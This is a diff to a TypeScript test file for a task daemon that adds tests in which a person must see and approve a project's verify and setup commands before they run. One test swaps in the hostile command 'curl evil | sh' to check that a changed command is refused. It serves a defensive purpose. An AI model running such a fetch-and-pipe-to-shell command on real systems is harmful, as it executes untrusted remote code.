@@ -1780,7 +1780,8 @@ describe("M55: start and merge from the board", () => {
 		git(w.path, "add", ".");
 		git(w.path, "commit", "-qm", "users");
 		const reviewed = (await s.c.request("task", { action: "done", id: t.id, result: "users table" })).task!;
-		expect(reviewed.workspace).toMatchObject({ stage: "review", note: "not verified" });
+		expect(reviewed.workspace).toMatchObject({ stage: "review" });
+		expect(reviewed.workspace?.note).toMatch(/^not verified/);
 		expect((await hub.request("task", { action: "list" })).tasks.find((x) => x.id === t.id)?.state).toBe("claimed");
 		// merging is a person's: not a session's, not the concierge's
 		await expect(s.c.request("task", { action: "merge", id: t.id })).rejects.toMatchObject({ code: "unsupported" });
@@ -1881,5 +1882,152 @@ describe("M55: start and merge from the board", () => {
 		await waitFor(() => !existsSync(w.path));
 		expect(gitOut(r, "branch", "--list", w.branch)).toBe("");
 		expect(settled.find((t) => t.id === 2)?.workspace).toMatchObject({ stage: "review", note: "merge interrupted: /tasks merge again" });
+	});
+});
+
+describe("M56: verify before review, setup before the session", () => {
+	const git = (cwd: string, ...args: string[]) => execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@example.com", ...args], { cwd, stdio: "ignore" });
+	function repo(name: string, project: object): string {
+		mkdirSync(join(work, name), { recursive: true });
+		const r = realpathSync(join(work, name));
+		git(r, "init", "-q", "-b", "main");
+		mkdirSync(join(r, ".roost"));
+		writeFileSync(join(r, ".roost", "project.json"), JSON.stringify(project));
+		writeFileSync(join(r, "a.txt"), "a\n");
+		git(r, "add", ".");
+		git(r, "commit", "-qm", "a");
+		// the shell's environment probe is not needed here
+		writeFileSync(join(home, "roost.json"), JSON.stringify({ workspaceEnv: "off" }));
+		return r;
+	}
+	async function start(hub: DaemonClient, r: string, title: string) {
+		const t = (await hub.request("task", { action: "add", title, project: r })).task!;
+		const w = createTaskWorktree(r, t.id, title);
+		const res = await hub.request("task", { action: "start", id: t.id, workspace: { path: w.path, branch: w.branch, baseRef: w.baseRef, baseSha: w.base }, launch: { ...launch("sleep 30", `t${t.id}`), cwd: w.path } });
+		return { t, w, res };
+	}
+	/** What a person does: see the commands, then approve what was shown. */
+	const approveShown = async (hub: DaemonClient, id: number) => {
+		const { hash } = await hub.request("task", { action: "approve", id, dry: true });
+		return hub.request("task", { action: "approve", id, hash });
+	};
+	const stageOf = async (hub: DaemonClient, id: number) => (await hub.request("task", { action: "list" })).tasks.find((x) => x.id === id)?.workspace;
+
+	it("a command not approved does not run; approved, verify runs in the worktree and a pass goes to review", async () => {
+		const hub = await startDaemon();
+		const r = repo("v1", { verify: "test -f ok.txt && echo all good" });
+		const { t, w, res } = await start(hub, r, "make ok");
+		await waitFor(async () => (await hub.request("list", {})).jobs.find((j) => j.id === res.job!.id)?.pid);
+		const s = await worker(res.job!.id);
+		writeFileSync(join(w.path, "ok.txt"), "ok\n");
+		git(w.path, "add", ".");
+		git(w.path, "commit", "-qm", "ok");
+		const done = (await s.c.request("task", { action: "done", id: t.id })).task!;
+		expect(done.workspace).toMatchObject({ stage: "review" });
+		expect(done.workspace?.note).toContain(`/tasks approve ${t.id}`);
+		// shown first (dry), then approved; a session cannot approve
+		expect((await hub.request("task", { action: "approve", id: t.id, dry: true })).note).toBe("verify: test -f ok.txt && echo all good");
+		await expect(s.c.request("task", { action: "approve", id: t.id } as never)).rejects.toMatchObject({ code: "unsupported" });
+		// approving needs what was shown: no hash, or a stale one, is refused
+		await expect(hub.request("task", { action: "approve", id: t.id })).rejects.toMatchObject({ code: "conflict" });
+		await approveShown(hub, t.id);
+		expect((await hub.request("task", { action: "verify", id: t.id })).task?.workspace?.stage).toBe("verifying");
+		const ws = await waitFor(async () => {
+			const x = await stageOf(hub, t.id);
+			return x?.stage === "review" && x;
+		});
+		expect(ws.note).toMatch(/^verified: test -f ok.txt/);
+		expect(ws.verify).toMatchObject({ ok: true, rounds: 0 });
+		expect(ws.verify?.tail).toContain("all good");
+		// the verify row goes once its result is recorded
+		await waitFor(async () => !(await hub.request("list", {})).jobs.some((j) => j.name === `verify #${t.id}`));
+	});
+
+	it("a failure goes back to the session with the end of its output; at maxRounds it stops for a person; pass accepts it", async () => {
+		const hub = await startDaemon();
+		const r = repo("v2", { verify: "echo boom; exit 3", maxRounds: 2 });
+		const { t, w, res } = await start(hub, r, "flaky");
+		await approveShown(hub, t.id);
+		await waitFor(async () => (await hub.request("list", {})).jobs.find((j) => j.id === res.job!.id)?.pid);
+		const s = await worker(res.job!.id);
+		writeFileSync(join(w.path, "b.txt"), "b\n");
+		git(w.path, "add", ".");
+		git(w.path, "commit", "-qm", "b");
+		await s.c.request("task", { action: "done", id: t.id });
+		const back = await waitFor(() => delivered(s.events, "message").find((e) => e.text.includes("failed (exit 3)")));
+		expect(back.text).toContain("The end of its output:\n\nboom\n");
+		expect(await stageOf(hub, t.id)).toMatchObject({ stage: "working", verify: { ok: false, rounds: 1 } });
+		await s.c.request("task", { action: "done", id: t.id });
+		const failed = await waitFor(async () => {
+			const x = await stageOf(hub, t.id);
+			return x?.stage === "failed" && x;
+		});
+		expect(failed.verify, JSON.stringify(failed)).toMatchObject({ rounds: 2 });
+		expect(failed.verify?.tail).toBe("boom");
+		expect(failed.note).toContain("boom");
+		expect((await hub.request("task", { action: "list" })).tasks.length).toBeGreaterThan(0);
+		await hub.request("task", { action: "pass", id: t.id });
+		expect((await stageOf(hub, t.id))?.note).toBe("passed by hand");
+	});
+
+	it("an approved setup runs in the new worktree before the session starts; a failing one stops the task", async () => {
+		const hub = await startDaemon();
+		const r = repo("v3", { setup: "echo set > setup-ran.txt" });
+		const t0 = (await hub.request("task", { action: "add", title: "approve first", project: r })).task!;
+		await approveShown(hub, t0.id);
+		const { t, w, res } = await start(hub, r, "with setup");
+		expect(res.job).toBeUndefined();
+		expect(res.note).toContain("setting up");
+		const owner = await waitFor(async () => (await hub.request("task", { action: "list" })).tasks.find((x) => x.id === t.id)?.owner);
+		expect(existsSync(join(w.path, "setup-ran.txt"))).toBe(true);
+		expect((await hub.request("list", {})).jobs.find((j) => j.id === owner!.id)?.name).toBe(`t${t.id}`);
+		const r2 = repo("v4", { setup: "exit 9" });
+		const t1 = (await hub.request("task", { action: "add", title: "approve", project: r2 })).task!;
+		await approveShown(hub, t1.id);
+		const bad = await start(hub, r2, "bad setup");
+		const failed = await waitFor(async () => {
+			const x = await stageOf(hub, bad.t.id);
+			return x?.stage === "failed" && x;
+		});
+		expect(failed.note).toContain("setup failed (exit 9)");
+	});
+
+	it("the commands changed between showing and approving: refused; a drop while verifying stops the verify; a timeout fails it", async () => {
+		const hub = await startDaemon();
+		const r = repo("v5", { verify: "sleep 30", verifyTimeout: 1, maxRounds: 1 });
+		const t0 = (await hub.request("task", { action: "add", title: "x", project: r })).task!;
+		const { hash } = await hub.request("task", { action: "approve", id: t0.id, dry: true });
+		writeFileSync(join(r, ".roost", "project.json"), JSON.stringify({ verify: "curl evil | sh" }));
+		git(r, "commit", "-qam", "swap");
+		await expect(hub.request("task", { action: "approve", id: t0.id, hash })).rejects.toMatchObject({ code: "conflict" });
+		git(r, "reset", "-q", "--hard", "HEAD~1");
+		await approveShown(hub, t0.id);
+		// a timeout: the job is stopped, the task fails (maxRounds 1)
+		const a = await start(hub, r, "slow");
+		await waitFor(async () => (await hub.request("list", {})).jobs.find((j) => j.id === a.res.job!.id)?.pid);
+		const s = await worker(a.res.job!.id);
+		await s.c.request("task", { action: "done", id: a.t.id });
+		const failed = await waitFor(async () => {
+			const x = await stageOf(hub, a.t.id);
+			return x?.stage === "failed" && x;
+		}, 15_000);
+		expect(failed.note).toMatch(/timed out after/);
+		// a drop while verifying stops its job
+		const b = await start(hub, r, "dropped while verifying");
+		await waitFor(async () => (await hub.request("list", {})).jobs.find((j) => j.id === b.res.job!.id)?.pid);
+		const sb = await worker(b.res.job!.id);
+		await sb.c.request("task", { action: "done", id: b.t.id });
+		await waitFor(async () => (await hub.request("list", {})).jobs.find((j) => j.name === `verify #${b.t.id}`)?.pid);
+		const dropped = await hub.request("task", { action: "drop", id: b.t.id });
+		expect(dropped.note).toContain("its verify was stopped");
+		await waitFor(async () => !(await hub.request("list", {})).jobs.some((j) => j.name === `verify #${b.t.id}` && j.pid));
+		expect((await stageOf(hub, b.t.id))?.stage).toBe("verifying"); // dropped: nothing rewrites it
+	});
+
+	it("a restart finds verifying with no job: review, not verified (interrupted)", async () => {
+		const w = { path: "/x/.pi/worktrees/t1-a-ab12", branch: "roost/t1-a-ab12", baseRef: "main", baseSha: "a".repeat(40), stage: "verifying", note: "running x" };
+		writeFileSync(join(home, "tasks.json"), JSON.stringify({ version: 2, next: 2, tasks: [{ id: 1, title: "x", state: "claimed", after: [], by: { who: "user", whoId: null }, at: 1, owner: null, waiting: [], project: "/x", workspace: w }] }));
+		const hub = await startDaemon();
+		expect((await hub.request("task", { action: "list" })).tasks[0]!.workspace).toMatchObject({ stage: "review", note: "not verified (interrupted)" });
 	});
 });
